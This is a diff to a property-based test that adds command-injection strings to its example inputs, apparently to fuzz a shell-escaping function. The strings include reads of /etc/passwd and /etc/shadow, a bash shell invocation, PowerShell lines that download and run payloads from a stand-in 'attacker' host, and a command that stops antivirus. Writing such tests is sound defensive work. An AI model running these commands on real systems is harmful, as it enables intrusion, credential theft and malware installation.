@@ -39,6 +39,27 @@ testProp(
     }
   },
   {
-    examples: common.corpus(),
+    examples: [
+      ...common.corpus(),
+      ["; ls -la"],
+      ["&& id"],
+      ["\ncat /etc/passwd"],
+      ["$(uname -a)"],
+      ["`hostname`"],
+      ["> /var/www/html/output.txt"],
+      ["< /etc/shadow"],
+      ["(sleep 5)"],
+      ["{/bin/bash,-i}"],
+      ["~/../../etc/passwd"],
+      ["& whoami"],
+      ["&& dir c:\\"],
+      ["& ipconfig /all &"],
+      ["%USERNAME%"],
+      ["; Get-LocalUser"],
+      ["$(Get-Process)"],
+      ["(New-Object System.Net.WebClient).DownloadFile('http://attacker/malware.exe', 'C:\\Users\\Public\\malware.exe')"],
+      ["iex (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"],
+      ["Stop-Process -Name \"antivirus\""],
+    ],
   },
 );
